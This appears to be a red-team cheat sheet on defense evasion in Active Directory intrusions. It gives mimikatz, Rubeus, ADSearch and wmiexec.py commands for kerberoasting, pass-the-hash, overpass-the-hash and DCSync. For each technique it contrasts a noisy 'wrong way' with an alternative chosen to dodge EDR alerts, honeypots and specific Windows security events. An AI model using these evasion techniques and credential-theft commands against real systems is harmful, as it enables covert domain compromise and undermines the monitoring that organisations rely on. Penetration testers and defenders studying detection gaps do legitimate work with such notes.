# Defense evasion

## Method

### Shell commands

#### Wrong way

Process creation

* powershell.exe - `T1059.001`
  * whoami.exe** - **`T1033`

Commands

* Avoid to use following commands
  * In a short amount of time
  * Almost never used by non-IT users

```
whoami
hostname
net (user - view - group - localgroup - use)
ipconfig
netstat
netsh
route
tasklist
wmic
systeminfo
```

#### Alternatives

* Use C2 commands
  * **API**
  * Most of the time don't spawn processes

### Kerberoasting

#### Wrong way

* Kerberoasting all users
  * Trigger Honeypots
  * Volume of Windows event 4769 in a short time frame
  * User requesting service they've never used

#### Alternatives

* Enumerate potential targets first
  * Account age
  * Account description
  * Domain groups
  * Password last set
  * Logon Count
  * User where SPN is not null

```
 ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

* Rubeus filters
  * `/spn`: target a specific SPN
  * `/user`: target a specific user
  * `/ou`: target users of a specific OU
  * `/ldapfilter`: add LDAP filter

### Pass-the-Hash

#### Wrong way

* Dump using local administrator
* `sekurlsa::pth /user: /domain: /ntlm:`
  * `LSA process in now R/W`
  * **Patch LSASS** - process access detected by AV/EDR
    * No real alternative - this is how PtH works

#### Alternatives

* If you need it absolutly do it remotly

```
proxychains wmiexec.py <dom>/<user>@<ip> -hashes <ntlmhash>
```

### Overpass-the-hash

#### Wrong way

* Using the NTLM hash to request a TGT

```
rubeus.exe /asktgt /user:<> /domain:<> /rc4:<> /ptt
```

* It will generate a Windows event 4768
  * With `0x17` ticket encryption type
    * This type is legacy and is not anymore the default one

#### Alternatives

* Don't use the NTLM hash
* Use `ekeys` from `mimikatz `(kerberos encryption keys)
  * `sekurlsa::ekeys`
    * Use the `aes256_hmac `key
* Then use rubeus using the `aes256_hmac `key using the `aes256` parameter

```
rubeus.exe /asktgt /user:<> /domain:<> /aes256:<> /ptt
```

* It will generate the same Windows event but with `0x12` ticket encryption type which is **AES**

### DCSync

#### Wrong way

* `mimikatz # lsadump::dcsync /user:krbtgt`
  * Will generate replication trafic
    * Replication trafic always came from a DC
* DCSync from a non DC will raise alerts

#### Alternatives

* Do DCSync **from a DC**

## Ressources

* [https://www.youtube.com/watch?v=qIbrozlf2wM\&ab](https://www.youtube.com/watch?v=qIbrozlf2wM\&ab)&#x20;
